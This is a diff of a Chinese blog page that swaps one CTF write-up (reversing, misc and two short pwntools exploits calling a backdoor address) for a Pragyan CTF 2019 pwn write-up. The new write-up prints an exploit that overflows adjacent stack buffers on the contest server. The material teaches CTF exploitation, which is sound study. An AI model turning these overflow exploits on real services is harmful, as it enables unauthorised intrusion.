@@ -6,30 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>暨南大学个人赛林健斌wp(IP:s1m0n) | 一忘皆空</title>
+  <title>一忘皆空</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#汇编 ##Easy_Elf IDA对汇编代码进行反编译，看到sub_8048451()函数的返回值很关键，如果返回1则能跳转到正确，进入该函数查看。  看到21和24的值很直观，21要求为0x31,24要求为0x58。函数对20，22，23进行了异或，运算后可得20要求为0x4c，22要求为0x4e，23要求为0x55">
+  <meta name="description" content="第一题源程序：challenge1先丢进IDA，F5，分析运行过程。程序先生成了3个随机数并输出，然后需要输入一个字符串s：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="暨南大学个人赛林健斌wp(IP:s1m0n)">
-<meta property="og:url" content="http://yoursite.com/2019/03/18/暨南大学个人赛林健斌wp/index.html">
+<meta property="og:title" content="一忘皆空">
+<meta property="og:url" content="http://yoursite.com/2019/03/18/pragyan ctf2019 pwn部分wp/index.html">
 <meta property="og:site_name" content="一忘皆空">
-<meta property="og:description" content="#汇编 ##Easy_Elf IDA对汇编代码进行反编译，看到sub_8048451()函数的返回值很关键，如果返回1则能跳转到正确，进入该函数查看。  看到21和24的值很直观，21要求为0x31,24要求为0x58。函数对20，22，23进行了异或，运算后可得20要求为0x4c，22要求为0x4e，23要求为0x55">
+<meta property="og:description" content="第一题源程序：challenge1先丢进IDA，F5，分析运行过程。程序先生成了3个随机数并输出，然后需要输入一个字符串s：">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/db65e8ec11a64891ba909c9cb04305f3/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/5c755f44dd5bcbd0e71964a337fb6d85/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/502ae615b66c04da06fba2a83d3afbf8/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/0f68e4943a6dc76638e85e8122c39a9b/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/fd9eb841232eef44c7212409fe933c9c/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/9cd974ac7bfddf060b7fc8f2a4c4eaa3/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/6702f191ab65fe8e36c3be6429801d58/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/9cc5ed2a7e1114a058c0f9e3d7330e7c/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/bbfd36acbd7c4722f5b6ae7a128c8b34/0">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/ebb08788dd4c6c34b4e18549d955e877/0">
-<meta property="og:updated_time" content="2019-03-17T16:26:04.278Z">
+<meta property="og:updated_time" content="2019-03-18T04:47:44.894Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="暨南大学个人赛林健斌wp(IP:s1m0n)">
-<meta name="twitter:description" content="#汇编 ##Easy_Elf IDA对汇编代码进行反编译，看到sub_8048451()函数的返回值很关键，如果返回1则能跳转到正确，进入该函数查看。  看到21和24的值很直观，21要求为0x31,24要求为0x58。函数对20，22，23进行了异或，运算后可得20要求为0x4c，22要求为0x4e，23要求为0x55">
-<meta name="twitter:image" content="https://qqadapt.qpic.cn/txdocpic/0/db65e8ec11a64891ba909c9cb04305f3/0">
+<meta name="twitter:title" content="一忘皆空">
+<meta name="twitter:description" content="第一题源程序：challenge1先丢进IDA，F5，分析运行过程。程序先生成了3个随机数并输出，然后需要输入一个字符串s：">
   
     <link rel="alternative" href="/atom.xml" title="一忘皆空" type="application/atom+xml">
   
@@ -165,62 +154,18 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-暨南大学个人赛林健斌wp" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pragyan ctf2019 pwn部分wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      暨南大学个人赛林健斌wp(IP:s1m0n)
-    </h1>
-  
-
-        
-        <a href="/2019/03/18/暨南大学个人赛林健斌wp/" class="archive-article-date">
-  	<time datetime="2019-03-17T16:20:55.921Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-18</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#汇编</p>
-<p>##Easy_Elf</p>
-<p>IDA对汇编代码进行反编译，看到sub_8048451()函数的返回值很关键，如果返回1则能跳转到正确，进入该函数查看。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/db65e8ec11a64891ba909c9cb04305f3/0" alt="img"></p>
-<p>看到21和24的值很直观，21要求为0x31,24要求为0x58。函数对20，22，23进行了异或，运算后可得20要求为0x4c，22要求为0x4e，23要求为0x55<br><a id="more"></a><br>查ASCII对应字符，按顺序排列得:L1NUX</p>
-<p>得到flag:flag{L1NUX}</p>
-<p>##div<br>文本文件为AT&amp;T格式的汇编代码，对代码进行翻译，了解了执行过程，但是不知道怎么求N，于是直接把汇编代码在linux上跑一下。</p>
-<p>先编写一个普通的C程序，如图，执行gcc -S 生成汇编代码，对其中add()函数部分进行修改，改为题目代码，gcc -c生成.o文件，再gcc生成可执行文件。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/5c755f44dd5bcbd0e71964a337fb6d85/0" alt="img"></p>
-<p>因为输出结果为x/N，因此考虑找输入值x，输入x时输出1，输入x-1时输出0，则x=N。二分法暴力破解。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/502ae615b66c04da06fba2a83d3afbf8/0" alt="img"></p>
-<p>最后得到结果，即为flag:flag{974873638438446}</p>
-<p>##windows-reverse<br>IDA查看汇编代码，F5反编译，看到第一个判断。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/0f68e4943a6dc76638e85e8122c39a9b/0" alt="img"></p>
-<p>看到v7!=2018，直接猜第一个输入是2018，正确，到第二个判断。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/fd9eb841232eef44c7212409fe933c9c/0" alt="img"></p>
-<p>看到判断v3，若为真则成功。v3最后被函数sub_401610赋值，进入查看。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/9cd974ac7bfddf060b7fc8f2a4c4eaa3/0" alt="img"></p>
-<p>看到这个字符串，应该是要判断是否相等。考虑到flag一般有含义，这里很明显是reverse_1s_very_easy的一个乱序字符串，因此直接试。。。成功。。。</p>
-<p>最后提交flag(一个大坑。。。要记得补上前面的2018):flag{2018reverse_1s_very_easy}</p>
-<p>#pwn</p>
-<p>##tutorial1<br>IDA反编译，非常简单的读入read，然后传值给buf数组，满足buf=0xbabababa即可。使用pwntools构造payload。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">'35.221.144.41'</span></span><br><span class="line">PORT=<span class="string">'10003'</span></span><br><span class="line">p=remote(HOST,PORT)</span><br><span class="line">p.recv()</span><br><span class="line">guess=p64(<span class="number">0xbabababa</span>)</span><br><span class="line">p.send(guess)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/6702f191ab65fe8e36c3be6429801d58/0" alt="img"></p>
-<p>得到flag如上图</p>
-<p>##tutorial2<br>老规矩IDA反编译，看到有两次read()，第一次思路跟tutorial1一样，满足buf=0xdeadbeef即可。第二次read()把读入数据传入rax，然后call rax，因此rax填backdoor()地址即可。</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/9cc5ed2a7e1114a058c0f9e3d7330e7c/0" alt="img"></p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/bbfd36acbd7c4722f5b6ae7a128c8b34/0" alt="img"></p>
-<p>backdoor()地址为0x4006e6，pwntools构造payload。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">'35.221.144.41'</span></span><br><span class="line">PORT=<span class="string">'10004'</span></span><br><span class="line">p=remote(HOST,PORT)</span><br><span class="line">p.recv()</span><br><span class="line">guess=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#这里注意要是32位，如果用p64会直接把第二次读入的数据覆盖导致无法读入第二次数据</span></span><br><span class="line">p.send(guess)</span><br><span class="line">guess=p64(<span class="number">0x00000000004006e6</span>)</span><br><span class="line">p.send(guess)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/ebb08788dd4c6c34b4e18549d955e877/0" alt="img"></p>
-<p>得到flag如上图</p>
-<p>#Misc</p>
-<p>##签到题<br>进去看公告即可</p>
-<p>##我最爱吃培根卷<br>培根密码，上网查对应，解得flag：flag{bacon}</p>
-<p>##和尚解密<br>上网查ctf 佛曰，查到一个在线解密网址:<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
-<p>输入解密即可得到flag:flag{xp0int666}</p>
+        <h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a><strong>第一题</strong></h3><p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/challenge1" target="_blank" rel="noopener">challenge1</a><br>先丢进IDA，F5，分析运行过程。<br>程序先生成了3个随机数并输出，然后需要输入一个字符串s：<br><a id="more"></a><br><a href="https://qqadapt.qpic.cn/txdocpic/0/290c61463224077f5064b2eb6502952b/0" target="_blank" rel="noopener">img</a><br>之后验证s中是否只包含数字字符和负号：<br><a href="https://qqadapt.qpic.cn/txdocpic/0/4de09b6f6c6c0701fe28259b0ffe8b0f/0" target="_blank" rel="noopener">img</a><br>然后把s,nptr,v15中的字符串使用atoi()转换成整数v9,v10,v11，并满足3个if中的条件即可得到flag：<br><a href="https://qqadapt.qpic.cn/txdocpic/0/c1370db5b51b9ba16b871e3443fe3408/0" target="_blank" rel="noopener">img</a><br>虽然我们只输入了字符串s，但观察发现s,nptr,v15是相连的，可以通过写s写穿到其他两个变量中，3个变量大小都为10字节：<br><a href="https://qqadapt.qpic.cn/txdocpic/0/f251a9493d3a53d1bd7ecdd7e6311c70/0" target="_blank" rel="noopener">img</a><br>接下来就是解方程，求出v9,v10,v11，然后填到s中并传输。<br>这里有个坑，由于需要通过s直接写到nptr,v15，这说明3个变量实际上是没有‘\0’这种分隔符的，一旦调用atoi(s)，就会把后面的数据也读取到s中。因此要考虑怎么分隔3个变量。既然它限制了输入只能是数字字符和负号，数字显然不能分隔，这样只能是用负号把剩下的空间填充。<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(num)</span>:</span></span><br><span class="line">	num=str(num)</span><br><span class="line">	<span class="keyword">return</span> num+(<span class="number">10</span>-len(num))*<span class="string">'-'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process("./challenge1")</span></span><br><span class="line">io=remote(<span class="string">"159.89.166.12"</span>,<span class="number">9800</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">":)\n"</span>)</span><br><span class="line">x=io.recvuntil(<span class="string">";"</span>)</span><br><span class="line">x=x[<span class="number">0</span>:len(x)<span class="number">-1</span>]</span><br><span class="line">y=io.recvuntil(<span class="string">";"</span>)</span><br><span class="line">y=y[<span class="number">0</span>:len(y)<span class="number">-1</span>]</span><br><span class="line">z=io.recvuntil(<span class="string">";"</span>)</span><br><span class="line">z=z[<span class="number">0</span>:len(z)<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">x=int(x)</span><br><span class="line">y=int(y)</span><br><span class="line">z=int(z)</span><br><span class="line"></span><br><span class="line">a=(z-y+x)/<span class="number">2</span></span><br><span class="line">b=(x+y-z)/<span class="number">2</span></span><br><span class="line">c=(y-x+z)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">a=change(a)</span><br><span class="line">b=change(b)</span><br><span class="line">c=change(c)</span><br><span class="line"></span><br><span class="line">io.sendline(a+b+c)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：<br><a href="https://qqadapt.qpic.cn/txdocpic/0/4c53f160dc7ebc9bbe85104435ab05d9/0" target="_blank" rel="noopener">img</a></p>
+<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a><strong>第二题</strong></h3><p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/secret%20keeper/secure_secrets" target="_blank" rel="noopener">secure_secrets</a></p>
+<blockquote>
+<p><a href="https://naivenom.tistory.com/18" target="_blank" rel="noopener">参考WP</a><br>WP晚点写</p>
+</blockquote>
+<h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a><strong>第三题</strong></h3><p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/armoury/armoury" target="_blank" rel="noopener">armoury</a></p>
 
       
 
@@ -300,7 +245,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/18/暨南大学个人赛林健斌wp/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/18/pragyan ctf2019 pwn部分wp/" alt="微信分享二维码">
     </div>
 </div>
 
